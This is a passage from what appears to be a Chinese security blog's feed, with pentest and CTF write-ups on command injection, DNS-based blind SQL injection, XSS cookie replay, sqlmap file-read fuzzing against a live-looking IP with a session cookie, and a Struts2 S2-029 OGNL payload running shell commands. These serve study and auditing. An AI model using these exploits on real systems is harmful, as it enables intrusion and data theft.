<span class="keyword">local</span> <span class="keyword">function</span> run(msg, matches)
  <span class="keyword">if</span> matches[<span class="number">1</span>] ~= <span class="string">'!minecraft'</span> <span class="keyword">then</span>
    operation = matches[<span class="number">1</span>]
  <span class="keyword">else</span>
    <span class="keyword">return</span> <span class="string">"!minecraft start|stop|restart"</span>
  <span class="keyword">end</span>
  <span class="keyword">if</span> <span class="keyword">string</span>.find(operation, <span class="string">'&amp;'</span>) <span class="keyword">or</span> <span class="keyword">string</span>.find(operation, <span class="string">'|'</span>) <span class="keyword">or</span> <span class="keyword">string</span>.find(operation, <span class="string">'`'</span>) <span class="keyword">then</span>
    <span class="keyword">return</span> <span class="string">"Invalid operation "</span> .. operation
  <span class="keyword">end</span>
  <span class="keyword">local</span> <span class="keyword">t</span> = io.popen(<span class="string">'cd /home/telegram &amp;&amp; ./mc '</span> .. operation)
  <span class="keyword">local</span> a = <span class="keyword">t</span>:<span class="keyword">read</span>(<span class="string">"*all"</span>)
  <span class="keyword">return</span> a
<span class="keyword">end</span>
<span class="keyword">return</span> {
  description = <span class="string">"loli.club minecraft bot!"</span>,
  <span class="keyword">usage</span> = <span class="string">"!minecraft start|stop|restart"</span>,
  patterns = {
    <span class="string">"^!minecraft$"</span>,
    <span class="string">"^!minecraft (.*)$"</span>
  },
  run = run
}
<span class="keyword">end</span>%</span>
</code></pre><p>比较明显的命令注入漏洞。参考<a href="http://drops.wooyun.org/papers/1018" target="_blank" rel="external">Shell Injection &amp; Command Injection</a>。没有过滤分号<code>;</code>。</p>
<p>第一次用telegram，找到bot的账号花了一会时间。本身漏洞是比较典型的。</p>
<p><img src="/images/cctf14.png" alt=""></p>
<h1 id="DNS注入">DNS注入</h1><p>这个题目没有做出来。一是没有考虑到别人留的后门，再一个没找到回显的注入方式。writeup可以参考<a href="http://bobao.360.cn/ctf/detail/159.html" target="_blank" rel="external">FlappyPig CCTF-2016 WriteUp</a>。</p>
<p>一开始通过爆破域名，定位到ns.loli.club。发现该dns服务存在一些异常，但没有考虑到SQL注入，放出采用python和mysql搭建之后才考虑到sql注入。</p>
<p>使用nslookup可以简单验证，确实存在SQL注入。</p>
<p><img src="/images/cctf15.png" alt=""></p>
<p>没有找到回显的方式，尝试写一个代理，用sqlmap来进行盲注。发现dns.resolver模块对域名的合法性进行了检查，sqlmap拼出来的域名字段不是合法域名会报错。最后采用了分析dns协议，直接拼接二进制的方式写了一个布尔盲注的代理，用sqlmap跑出了数据。<a href="http://www.lisijie.org/tech/dns%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90.md" target="_blank" rel="external">dns协议解析</a></p>
<p>最终的代码：</p>
<pre><code><span class="comment">#!/usr/bin/env python</span>
<span class="comment"># encoding: utf-8</span>

<span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template
<span class="keyword">from</span> flask <span class="keyword">import</span> request, jsonify
<span class="keyword">import</span> socket
<span class="keyword">import</span> struct
<span class="keyword">import</span> time

app = Flask(__name__)
<span class="function"><span class="keyword">def</span> <span class="title">h2bin</span><span class="params">(x)</span>:</span>
    <span class="keyword">return</span> x.replace(<span class="string">' '</span>, <span class="string">''</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)
dns1 = h2bin(<span class="string">'''  a5 71 01 00 00 01 00 00  00 00 00 00 03 77 77 7704 6c 6f 6c 69'''</span>)
dns3 = h2bin(<span class="string">''' 00 00 01 00 01  '''</span>)
HOST=<span class="string">'120.27.149.210'</span>
PORT=<span class="number">53</span>

<span class="decorator">@app.route("/dns",methods=['GET','POST'])</span>
<span class="function"><span class="keyword">def</span> <span class="title">dnsquery</span><span class="params">()</span>:</span>
    name=request.args.get(<span class="string">'id'</span>)
    name=str(name)
    name_len=len(name)
    <span class="keyword">if</span> name_len&lt;<span class="number">10</span>:
        name_len1=<span class="string">'0'</span>+str(name_len)
    <span class="keyword">else</span>:
        name_len1=hex(name_len)
        <span class="keyword">print</span> name_len1

        <span class="keyword">if</span> len(name_len1)==<span class="number">3</span>:
            name_len1=<span class="string">'0'</span>+name_len1[<span class="number">2</span>:]
            <span class="keyword">print</span> name_len1
        <span class="keyword">else</span>:
            name_len1=name_len1[<span class="number">2</span>:]
            <span class="keyword">print</span> name_len1

    test=str(name_len)+<span class="string">'s'</span>

    <span class="keyword">print</span> test
    dnsdata=dns1+ h2bin(name_len1)+struct.pack(test,name) +dns3
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.sendto(dnsdata,(HOST, PORT))
    <span class="keyword">print</span> <span class="string">'sendall'</span>
    data=s.recv(<span class="number">1024</span>)
    <span class="keyword">return</span> repr(data[-<span class="number">4</span>:])

<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:
    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">8765</span>,threaded=<span class="keyword">True</span>)
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<p><img src="/images/cctf4.png" alt=""></p>
<h1 id="CCTF感受">CCTF感受</h1><p>周六花了一天时间做了下CCTF的pentest。还是有不少有意思的收获。这个名字叫pentest，而不是web，感觉也是花了心思的，]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用shell和python分析大日志文件]]></title>
    <link href="http://xdxd.love/2016/04/25/%E4%BD%BF%E7%94%A8shell%E5%92%8Cpython%E5%88%86%E6%9E%90%E5%A4%A7%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6/"/>
    <id>http://xdxd.love/2016/04/25/使用shell和python分析大日志文件/</id>
    <published>2016-04-25T07:49:37.000Z</published>
    <updated>2016-04-25T07:49:37.000Z</updated>
    <content type="html"></content>
    <summary type="html">
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[XSScookie利用工具cookie-hacker修改版]]></title>
    <link href="http://xdxd.love/2016/04/12/XSScookie%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7cookie-hacker%E4%BF%AE%E6%94%B9%E7%89%88/"/>
    <id>http://xdxd.love/2016/04/12/XSScookie利用工具cookie-hacker修改版/</id>
    <published>2016-04-12T07:49:06.000Z</published>
    <updated>2016-04-12T07:58:36.000Z</updated>
    <content type="html"><![CDATA[<p><a href="http://evilcos.me/?p=366" target="_blank" rel="external">cookiehacker</a>余弦大神些的cookie利用工具，可以方便的把xss收到的cookie写入本地。</p>
<p><img src="http://evilcos.me/wp-content/uploads/2013/10/123.jpg" alt=""><br>使用过程中遇到一个小问题。就是一个字段value值是base64编码的。里面有=号。使用cookiehacker写入的时候把等号自动给去掉了。</p>
<p>查看源码发现是这么写的。</p>
<pre><code>k = c.split(<span class="string">'='</span>)[<span class="number">0</span>].replace(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">""</span>).replace(<span class="string">' '</span>, <span class="string">'+'</span>);
v = c.split(<span class="string">'='</span>)[<span class="number">1</span>].replace(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">""</span>).replace(<span class="string">' '</span>, <span class="string">'+'</span>);
</code></pre><p>使用split等号来取值。导致value里的等号丢掉了。修改成使用substring取值，修复这个bug。</p>
<pre><code>k = c.<span class="keyword">substring</span>(<span class="number">0</span>,c.indexOf(<span class="string">'='</span>)).replace(/^\s+|\s+<span class="variable">$/</span>g, <span class="string">""</span>).replace(<span class="string">' '</span>, <span class="string">'+'</span>);
v = c.<span class="keyword">substring</span>(c.indexOf(<span class="string">'='</span>)+ <span class="number">1</span>).replace(/^\s+|\s+<span class="variable">$/</span>g, <span class="string">""</span>).replace(<span class="string">' '</span>, <span class="string">'+'</span>); 
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<p><a href="http://evilcos.me/?p=366" target="_blank" rel="external">cookiehacker</a>余弦大神些的cookie利用工具，可以方便的把xss收到的cookie写入本地。</p>
<p><img sr]]>
    </summary>
    
      <category term="xss" scheme="http://xdxd.love/tags/xss/"/>
    
      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[smali插桩调试apk]]></title>
    <link href="http://xdxd.love/2016/04/08/smali%E6%8F%92%E6%A1%A9%E8%B0%83%E8%AF%95apk/"/>
    <id>http://xdxd.love/2016/04/08/smali插桩调试apk/</id>
    <published>2016-04-08T01:45:16.000Z</published>
    <updated>2016-04-08T02:28:55.000Z</updated>
    <content type="html"><![CDATA[<h1 id="参考资料">参考资料</h1><p><a href="http://drops.wooyun.org/papers/6045" target="_blank" rel="external">安卓动态调试七种武器之长生剑 - Smali Instrumentation</a></p>
<p><a href="http://www.52pojie.cn/thread-255754-1-1.html" target="_blank" rel="external">Smali注入之打造属于自己的安卓crack利器</a></p>
<h1 id="利用代码">利用代码</h1><pre><code><span class="keyword">.class</span><span class="keyword"> public</span> <span class="class">Lcrack;</span>
<span class="keyword">.super</span> <span class="class">Ljava/lang/Object;</span>
<span class="keyword">.source</span> <span class="string">"crack.java"</span>

<span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span><span class="function"> log(</span><span class="class">Ljava/lang/String;</span><span class="function">)</span>V
<span class="keyword">    .locals</span> 1
<span class="keyword">    .prologue</span>

   <span class="instruction"> const-string </span><span class="variable">v0</span>, <span class="string">"info"</span>
   <span class="instruction"> invoke-static </span>{<span class="variable">v0</span>, <span class="variable">p0</span>}, <span class="class">Landroid/util/Log;</span><span class="function">-&gt;d(</span><span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span><span class="function">)</span>I
   <span class="instruction"> return-void
</span><span class="keyword">.end method</span>
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<h1 id="参考资料">参考资料</h1><p><a href="http://drops.wooyun.org/papers/6045" target="_blank" rel="external">安卓动态调试七种武器之长生剑 - Smali Instrumentatio]]>
    </summary>
    
      <category term="移动安全" scheme="http://xdxd.love/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[logcat使用指南]]></title>
    <link href="http://xdxd.love/2016/04/07/logcat%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <id>http://xdxd.love/2016/04/07/logcat使用指南/</id>
    <published>2016-04-07T06:08:27.000Z</published>
    <updated>2016-04-07T07:36:37.000Z</updated>
    <content type="html"><![CDATA[<p>一共5中日志的输出方式：</p>
<p>android.util.Log：提供了五种输出日志的方法</p>
<p>Log.e(), Log.w(), Log.i(), Log.d(), Log.v()</p>
<p>ERROR, WARN, INFO, DEBUG, VERBOSE</p>
<p>adb logcat 命令会有非常多的输出，可以通过pid来过滤特定app的输出。</p>
<h1 id="案例">案例</h1><p>房多多新房经纪人app logcat 默认输出了debug日志：</p>
<pre><code>/ActivityManager( <span class="number">1301</span>): Displayed com.fangdd.mobile.agent/com.fangdd.app.LoginActivity: +<span class="number">536</span>ms (total +<span class="number">1</span>s34ms)
I/Timeline( <span class="number">1301</span>): Timeline: Activity_windows_visible id: ActivityRecord{<span class="number">43</span>dbf058 u0 com.fangdd.mobile.agent/com.fangdd.app.MainActivity t319} <span class="built_in">time</span>:<span class="number">184792085</span>
I/Timeline( <span class="number">1301</span>): Timeline: Activity_windows_visible id: ActivityRecord{<span class="number">4549</span>a178 u0 com.fangdd.mobile.agent/com.fangdd.app.LoginActivity t319} <span class="built_in">time</span>:<span class="number">184792510</span>
D/dalvikvm(<span class="number">24780</span>): Trying <span class="built_in">to</span> <span class="built_in">load</span> lib /data/app-lib/com.fangdd.mobile.agent-<span class="number">1</span>/libfddutils.so <span class="number">0x41a7b430</span>
D/dalvikvm(<span class="number">24780</span>): Added shared lib /data/app-lib/com.fangdd.mobile.agent-<span class="number">1</span>/libfddutils.so <span class="number">0x41a7b430</span>
D/dalvikvm(<span class="number">24780</span>): No JNI_OnLoad found <span class="operator">in</span> /data/app-lib/com.fangdd.mobile.agent-<span class="number">1</span>/libfddutils.so <span class="number">0x41a7b430</span>, skipping init
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.<span class="operator">a</span>.<span class="operator">a</span>.<span class="operator">a</span>(ProtoUtils.java:<span class="number">40</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.app.e.<span class="operator">a</span>.<span class="operator">a</span>.<span class="operator">a</span>(NewServerManager.java:<span class="number">412</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.app.e.<span class="operator">a</span>.<span class="operator">a</span>.<span class="operator">a</span>(NewServerManager.java:<span class="number">188</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.app.e.n.<span class="operator">a</span>(UserServerManager.java:<span class="number">245</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.app.ak.<span class="operator">a</span>(LoginActivity.java:<span class="number">147</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.mobile.f.<span class="operator">a</span>.<span class="operator">a</span>(BaseAsyncTask.java:<span class="number">23</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.mobile.f.<span class="operator">a</span>.doInBackground(BaseAsyncTask.java:<span class="number">8</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.<span class="operator">a</span>.<span class="operator">a</span>.<span class="operator">a</span>(ProtoUtils.java:<span class="number">40</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.app.e.<span class="operator">a</span>.<span class="operator">a</span>.<span class="operator">a</span>(NewServerManager.java:<span class="number">412</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.app.e.<span class="operator">a</span>.<span class="operator">a</span>.<span class="operator">a</span>(NewServerManager.java:<span class="number">188</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.app.e.n.<span class="operator">a</span>(UserServerManager.java:<span class="number">245</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.app.ak.<span class="operator">a</span>(LoginActivity.java:<span class="number">147</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.mobile.f.<span class="operator">a</span>.<span class="operator">a</span>(BaseAsyncTask.java:<span class="number">23</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.mobile.f.<span class="operator">a</span>.doInBackground(BaseAsyncTask.java:<span class="number">8</span>)
</code></pre><p>这个是登录过程中的日志。这个app登录采用了tcp传输的二进制协议，而且进行了签名。通过这个日志，可以方便逆向分析。</p>
<h1 id="参考资料">参考资料</h1><p><a href="http://drops.wooyun.org/tips/3812" target="_blank" rel="external">http://drops.wooyun.org/tips/3812</a></p>
<p><a href="http://www.cnblogs.com/imouto/archive/2012/12/11/filtering-adb-logcat-output.html" target="_blank" rel="external">http://www.cnblogs.com/imouto/archive/2012/12/11/filtering-adb-logcat-output.html</a></p>
<p><a href="https://wiki.cyanogenmod.org/w/Doc:_debugging_with_logcat/zh-cn" target="_blank" rel="external">https://wiki.cyanogenmod.org/w/Doc:_debugging_with_logcat/zh-cn</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>一共5中日志的输出方式：</p>
<p>android.util.Log：提供了五种输出日志的方法</p>
<p>Log.e(), Log.w(), Log.i(), Log.d(), Log.v()</p>
<p>ERROR, WARN, INFO, DEBUG, VER]]>
    </summary>
    
      <category term="移动安全" scheme="http://xdxd.love/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用python识别验证码]]></title>
    <link href="http://xdxd.love/2016/04/05/%E4%BD%BF%E7%94%A8python%E8%AF%86%E5%88%AB%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    <id>http://xdxd.love/2016/04/05/使用python识别验证码/</id>
    <published>2016-04-05T06:27:34.000Z</published>
    <updated>2016-04-05T06:27:34.000Z</updated>
    <content type="html"></content>
    <summary type="html">
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[sql注入load_file fuzz]]></title>
    <link href="http://xdxd.love/2016/04/05/sql%E6%B3%A8%E5%85%A5load-file-fuzz/"/>
    <id>http://xdxd.love/2016/04/05/sql注入load-file-fuzz/</id>
    <published>2016-04-05T06:06:16.000Z</published>
    <updated>2016-04-05T06:22:18.000Z</updated>
    <content type="html"><![CDATA[<p>在linux系统上即使mysql有文件权限，由于目录权限的问题，一般也没法写shell。只能通过读文件来获取敏感信息。</p>
<p>SQLNuke就是一个fuzz load_file的工具。详细的使用说明可以参考：<a href="http://danqingdani.blog.163.com/blog/static/186094195201322811145735/" target="_blank" rel="external">SQLNuke——mysql 注入load_file Fuzz工具</a>.</p>
<p>不过sqlnuke看说明只支持回显的union的的方式。写一个下脚本用sqlmap来fuzz load_file也是一个不错的方式。</p>
<pre><code><span class="comment">#!/usr/bin/env python</span>
<span class="comment"># encoding: utf-8</span>
import subprocess
filepaths = <span class="keyword">open</span>(<span class="string">'filelist.txt'</span>)
<span class="keyword">for</span> filepath in filepaths:
    cmdline = <span class="string">"python /Users/xxxxxx/security/web/sqlmap/sqlmap.py -u 'http://1.1.25.41/cms/privilege/publist?level=3&amp;title=jj' --cookie='_pss=PcqD<span class="variable">%2BvOIi05CQLYgBqHVE</span><span class="variable">%2Bm9oeAswCYOYYyZZTA0b4wk8KUMrHTuBJmyyZdqch</span><span class="variable">%2Fpwd</span><span class="variable">%2F7QcVCaehUtF0QHhpgkJliaAruL0dxGR</span><span class="variable">%2B8mwM0</span><span class="variable">%2FGc</span><span class="variable">%3D</span>' --batch --file-read="</span> +filepath
    fuzzsqlmap_proc = subprocess.Popen(cmdline,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    <span class="keyword">print</span> filepath
    process_output = fuzzsqlmap_proc.stdout.readlines()
    <span class="keyword">print</span> process_output
</code></pre><p>使用python，几行代码就可以搞定。然后到sqlmap输出目录里根据文件大小查看下载下来的文件就可以了。感觉，根据目标系统的环境，搭建一个一样的系统，然后列出所有的文件作为字典来进行fuzz应该是一个不错的思路。</p>
<p>尝试load_file(目录)，返回为null，如果可以load_file目录的话~~</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>在linux系统上即使mysql有文件权限，由于目录权限的问题，一般也没法写shell。只能通过读文件来获取敏感信息。</p>
<p>SQLNuke就是一个fuzz load_file的工具。详细的使用说明可以参考：<a href="http://danqingdani.b]]>
    </summary>
    
      <category term="sql注入" scheme="http://xdxd.love/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[bugfree任意文件上传漏洞]]></title>
    <link href="http://xdxd.love/2016/03/28/bugfree%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%BC%A4%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://xdxd.love/2016/03/28/bugfree任意文件伤上传漏洞/</id>
    <published>2016-03-28T08:57:49.000Z</published>
    <updated>2016-03-28T09:15:37.000Z</updated>
    <content type="html"><![CDATA[<h1 id="漏洞详情">漏洞详情</h1><p><a href="http://wooyun.org/bugs/wooyun-2010-023919" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-023919</a><br><a href="http://wooyun.org/bugs/wooyun-2010-074519" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-074519</a></p>
<p>最近渗透过程中遇到一个3.0.2版本的bugfree。利用这个上传获得shell。这个上传其实并不鸡肋。如果bugfree这种系统一般都会存在弱口令，而上传的目录文件名只有3位随机。所以如果可以解析的话就可以getshell。新版本中设置文件目录为bugFile。位于bugfree程序文件的上一级目录。如果运维配置web目录的时候根目录为bugfree目录上一级，也会存在安全问题。</p>
<p><img src="/images/bugfree1.png" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="漏洞详情">漏洞详情</h1><p><a href="http://wooyun.org/bugs/wooyun-2010-023919" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2]]>
    </summary>
    
      <category term="bugfree" scheme="http://xdxd.love/tags/bugfree/"/>
    
      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[struts2 s2-029 漏洞]]></title>
    <link href="http://xdxd.love/2016/03/21/struts2-s2-029-%E6%BC%8F%E6%B4%9E/"/>
    <id>http://xdxd.love/2016/03/21/struts2-s2-029-漏洞/</id>
    <published>2016-03-21T02:14:55.000Z</published>
    <updated>2016-03-22T08:23:23.000Z</updated>
    <content type="html"><![CDATA[<p>S2-029的公告说是可能的远程代码执行。而且依然是ognl导致的。</p>
<pre><code>The Apache Struts frameworks performs double evaluation of attributes <span class="built_in">values</span> assigned <span class="keyword">to</span> certain <span class="keyword">tags</span> <span class="keyword">so</span> it <span class="keyword">is</span> possible <span class="keyword">to</span> pass in <span class="keyword">a</span> value that will <span class="keyword">be</span> evaluated again when <span class="keyword">a</span> <span class="keyword">tag</span>’<span class="keyword">s</span> attributes will <span class="keyword">be</span> rendered.
</code></pre><p>目前网上已经有一些成熟的参考的资料了。详见文末参考资料。这次的漏洞虽然是代码执行。但是风险不高，需要开发者使用了特定的代码写法才会导致漏洞。需要直接将用户提交的数据通过标签设置成属性值。</p>
<p>比如：</p>
<pre><code><span class="tag">&lt;<span class="title">s:i18n</span> <span class="attribute">name</span>=<span class="value">"%&amp;#123#request.lan&amp;#125"</span>&gt;</span>xxxxx<span class="tag">&lt;/<span class="title">s:i18n</span>&gt;</span>
<span class="tag">&lt;<span class="title">set</span> <span class="attribute">var</span>=<span class="value">"%&amp;#123#parameters.tang3&amp;#125"</span>/&gt;</span>
</code></pre><p>通过<code>%&amp;#123#&amp;#125</code>的方式获取用户输入放入标签属性，会导致代码执行。struts2的修复方式也是直接过滤了<code>%&amp;#123&amp;#125</code>形式的字符串的ognl解析。</p>
<p><img src="/images/struts0291.png" alt=""></p>
<pre><code>这段代码的修改用来处理掉了非%&amp;<span class="preprocessor">#<span class="number">123</span>开头，&amp;#<span class="number">125</span>结尾的字符串进行ognl解析的功能，这里我们来举个例子：bar%&amp;#<span class="number">1232</span>+<span class="number">3</span>&amp;#<span class="number">125</span>，在修改之前的代码中<span class="number">2</span>+<span class="number">3</span>是会被作为ognl执行的。那么修改后，这种形式就只会被当做字符串来返回。</span>
</code></pre><p>审计方式就是查看是否有<code>%&amp;#123#&amp;#125</code>这种方式获取用户输入变量复制给标签属性的代码写法。</p>
<p>测试代码：</p>
<pre><code><span class="xml"></span>&lt;%<span class="perl"><span class="variable">@page</span> import=<span class="string">"java.util.HashSet"</span></span>%&gt;<span class="xml">
</span>&lt;%<span class="perl">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span>%&gt;<span class="xml">
</span>&lt;%<span class="perl">@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> </span>%&gt;<span class="xml">
<span class="tag">&lt;<span class="title">html</span>&gt;</span>
<span class="tag">&lt;<span class="title">head</span>&gt;</span><span class="tag">&lt;<span class="title">title</span>&gt;</span>Demo jsp page<span class="tag">&lt;/<span class="title">title</span>&gt;</span><span class="tag">&lt;/<span class="title">head</span>&gt;</span>
<span class="tag">&lt;<span class="title">body</span>&gt;</span>
</span>&lt;%<span class="perl">
  request.setAttribute(<span class="string">"lan"</span>, <span class="string">"'),#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#a=<span class="variable">@java</span>.lang.Runtime<span class="variable">@getRuntime</span>(),#a.exec('touch /tmp/1111'),new java.lang.String('"</span>);
</span>%&gt;<span class="xml">
<span class="tag">&lt;<span class="title">s:i18n</span> <span class="attribute">name</span>=<span class="value">"%&amp;#123#request.lan&amp;#125"</span>&gt;</span>xxxxx<span class="tag">&lt;/<span class="title">s:i18n</span>&gt;</span>
<span class="tag">&lt;/<span class="title">body</span>&gt;</span>
<span class="tag">&lt;/<span class="title">html</span>&gt;</span></span>
</code></pre><p><img src="/images/struts0292.png" alt=""></p>
<p>查看tmp目录文件已经生成。</p>
<p><img src="/images/struts0293.png" alt=""></p>
<h1 id="参考资料">参考资料</h1><p><a href="http://blog.nsfocus.net/struts-framework-s2-29-remote-code-execution-vulnerability/" target="_blank" rel="external">http://blog.nsfocus.net/struts-framework-s2-29-remote-code-execution-vulnerability/</a></p>
<p><a href="http://seclab.dbappsecurity.com.cn/?p=678" target="_blank" rel="external">http://seclab.dbappsecurity.com.cn/?p=678</a></p>
<p><a href="http://www.freebuf.com/vuls/99234.html" target="_blank" rel="external">http://www.freebuf.com/vuls/99234.html</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>S2-029的公告说是可能的远程代码执行。而且依然是ognl导致的。</p>
<pre><code>The Apache Struts frameworks performs double evaluation of attributes <span class="buil]]>
    </summary>
    
      <category term="java" scheme="http://xdxd.love/tags/java/"/>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[google firing-range xss测试应用]]></title>
    <link href="http://xdxd.love/2016/03/17/google-firing-range-xss%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8/"/>
    <id>http://xdxd.love/2016/03/17/google-firing-range-xss测试应用/</id>
    <published>2016-03-17T06:03:47.000Z</published>
    <updated>2016-03-18T00:17:48.000Z</updated>
    <content type="html"><![CDATA[<p><a href="https://github.com/google/firing-range" target="_blank" rel="external">firing-range</a>是谷歌发布的一个XSS测试环境，用来检测扫描器的能力。在线访问地址：<a href="https://public-firing-range.appspot.com" target="_blank" rel="external">https://public-firing-range.appspot.com</a></p>
<p>谷歌对每个位置都进行了详细的分类。</p>
<p><img src="/source/images/firing-range1.png" alt=""></p>
<p><img src="/source/images/firing-range2.png" alt=""></p>
<p>对其中两例进行分析：location.hash.assign</p>
<pre><code>    <span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
  <span class="keyword">var</span> payload = <span class="built_in">window</span>.location.hash.substr(<span class="number">1</span>);<span class="built_in">window</span>.location.assign(payload);
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
</code></pre><p>获取hash值，进入了assign函数。</p>
<p><img src="/source/images/firing-range3.png" alt=""></p>
<p>参考<a href="http://www.wooyun.org/bugs/wooyun-2013-041721" target="_blank" rel="external">搜狗浏览器4.2.2.9903任意网站伪造＋自有协议下XSS*2</a></p>
<p>location.hash.innerHtml</p>
<pre><code>    <span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
      <span class="keyword">var</span> payload = <span class="built_in">window</span>.location.hash.substr(<span class="number">1</span>);<span class="keyword">var</span> div = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);
div.id = <span class="string">'divEl'</span>;
<span class="built_in">document</span>.documentElement.appendChild(div);
<span class="keyword">var</span> divEl = <span class="built_in">document</span>.getElementById(<span class="string">'divEl'</span>);
divEl.innerHTML = payload;
    </span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
</code></pre><h1 id="location-search_和location-hash">location.search 和location.hash</h1><p>测试发现location.search获取到的值是浏览器地址栏url编码后的。而location.hash获取到的值是原始的值，既hash是%23获取到就是%23,hash是<code>&lt;</code>获取到就是<code>&lt;</code>说以直接innerHtml可以触发xss。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><a href="https://github.com/google/firing-range" target="_blank" rel="external">firing-range</a>是谷歌发布的一个XSS测试环境，用来检测扫描器的能力。在线访问地址：<a href]]>
    </summary>
    
      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[审计mybatis的sql注入]]></title>
    <link href="http://xdxd.love/2016/03/14/%E5%AE%A1%E8%AE%A1mybatis%E7%9A%84sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://xdxd.love/2016/03/14/审计mybatis的sql注入/</id>
    <published>2016-03-14T07:27:24.000Z</published>
    <updated>2016-03-15T02:24:39.000Z</updated>
    <content type="html"><![CDATA[<h1 id="mybatis_概述">mybatis 概述</h1><p><a href="http://www.mybatis.org/" target="_blank" rel="external">MyBatis</a>是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以对配置和原生Map使用简单的 XML 或注解，将接口和 Java 的 POJOs(Plain Old Java Objects,普通的 Java对象)映射成数据库中的记录</p>
<h1 id="mybatis存在的sql注入问题">mybatis存在的sql注入问题</h1><p>mybatis避免了用户直接拼接SQL语句，但是认为只要使用了mybatis就可以杜绝SQL注入的观点是不正确的。mybatis在配置SQL语句的时候，有两种描述参数的方式。<code>#{}</code>和<code>${}</code>。</p>
<p>比如：</p>
<pre><code>&lt;<span class="keyword">select</span> id=<span class="string">"selectPerson"</span> parameterType=<span class="string">"int"</span> resultType=<span class="string">"hashmap"</span>&gt;
  <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> PERSON <span class="keyword">WHERE</span> ID = <span class="preprocessor">#{id}</span>
&lt;/<span class="keyword">select</span>&gt;
